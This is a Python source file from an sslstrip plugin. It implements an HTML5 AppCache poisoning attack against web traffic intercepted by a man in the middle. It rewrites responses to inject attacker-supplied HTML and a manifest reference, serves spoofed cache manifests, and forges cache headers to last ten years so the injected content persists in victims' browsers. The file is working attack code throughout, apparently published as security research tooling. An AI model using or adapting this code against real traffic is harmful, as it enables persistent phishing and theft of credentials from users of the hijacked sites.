# Copyright (c) 2004-2009 Moxie Marlinspike, Krzysztof Kotowicz
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
from sslstrip.DummyResponseTamperer import DummyResponseTamperer
import re
import os.path
from datetime import date
import time

class AppCachePoison(DummyResponseTamperer):

    '''
    AppCachePosion performs HTML5 AppCache poisioning attack - see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html
    '''
    
    def tamper(self, url, data, headers, req_headers):
        if not self.isEnabled():
          return data
          
        url = self.urlMonitor.getRedirectionSource(url)
        
        (s,element) = self.getSectionForUrl(url)
        if not s:
          return data

        logging.log(logging.WARNING, "Found url %s in section %s" % (url, s['__name__']))
        p = self.getTemplatePrefix(s)
        if element == 'tamper':
          if os.path.exists(p + '.replace'): # replace whole content
            f = open(p + '.replace','r')
            data = self.decorate(f.read(), s)
            f.close()

          elif os.path.exists(p + '.append'): # append file to body
            f = open(p + '.append','r')
            appendix = self.decorate(f.read(), s)
            f.close()
            # append to body
            data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)

          # add manifest reference
          data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
          
        elif element == "manifest":
          data = self.getSpoofedManifest(url, s)
          headers.setRawHeaders("Content-Type", ["text/cache-manifest"])

        self.cacheForFuture(headers)
        return data

    def cacheForFuture(self, headers):
      ten_years = 315569260
      headers.setRawHeaders("Cache-Control",["max-age="+str(ten_years)])
      headers.setRawHeaders("Last-Modified",["Mon, 29 Jun 1998 02:28:12 GMT"]) # it was modifed long ago, so is most likely fresh
      in_ten_years = date.fromtimestamp(time.time() + ten_years)
      headers.setRawHeaders("Expires",[in_ten_years.strftime("%a, %d %b %Y %H:%M:%S GMT")])

    def getSpoofedManifest(self, url, section):
        p = self.getTemplatePrefix(section)
        if not os.path.exists(p+'.manifest'):
          p = self.getDefaultTemplatePrefix()

        f = open(p + '.manifest', 'r')
        manifest = f.read()
        f.close()
        return self.decorate(manifest, section)

    def decorate(self, content, section):
        for i in section:
          content = content.replace("%%"+i+"%%", section[i])
        return content

    def getTemplatePrefix(self, section):
        if section.has_key('templates'):
          return self.config['templates_path'] + '/' + section['templates']

        return self.getDefaultTemplatePrefix()

    def getDefaultTemplatePrefix(self):
          return self.config['templates_path'] + '/default'

    def getManifestUrl(self, section):
      return section["manifest_url"]

    def getSectionForUrl(self, url):
        for i in self.config:
          if isinstance(self.config[i], dict): #section
            section = self.config[i]
            if section.has_key('tamper_url') and section['tamper_url'] == url:
              return (section, 'tamper')
            if section.has_key('manifest_url') and section['manifest_url'] == url:
              return (section, 'manifest')

        return (False,'')

